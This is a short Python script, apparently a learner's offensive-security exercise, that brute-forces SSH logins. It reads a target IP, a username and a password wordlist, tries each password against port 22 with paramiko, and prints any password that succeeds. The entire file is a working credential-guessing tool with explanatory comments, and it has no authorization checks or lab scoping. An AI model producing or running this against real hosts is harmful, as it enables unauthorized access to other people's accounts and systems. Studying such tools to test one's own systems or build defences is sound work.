# Paramiko Lib automates process of connecting to SSH Client
# Termcolor Lib just allows us to print statements in diff colours
import paramiko, sys, os, socket, termcolor

host = input('<+> Target IP: ')
username = input('<+> SSH Username: ')
inputFile = input('<+> Passwords File: ')
print('\n')


# code=0 means the connection went through // code=1 means password is wrong // code=2 means host was offline maybe
def sshConnect(password, code=0):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    try:
        ssh.connect(host, port=22, username=username, password=password)

    except paramiko.AuthenticationException:
        code = 1
    except socket.error as e:
        code = 2
    ssh.close()
    return code


# os.path.exists checks whether the path exists or not as the name suggests
if os.path.exists(inputFile) == False:
    print('<!!> Path does not exist!')
    sys.exit(1)

# 'r' stands for read only // .readlines reads the entire line, .readline reads char by char
# response param is used to store the returned value of fx sshConnect aka the code value
with open(inputFile, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = sshConnect(password)
            if response == 0:
                print(termcolor.colored(('<+> Found password: ' + password + ' for account: ' + username), 'green'))
                break
            elif response == 1:
                print('<-> Incorrect password' + password)
            elif response == 2:
                print('<!> Unable to connect')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass
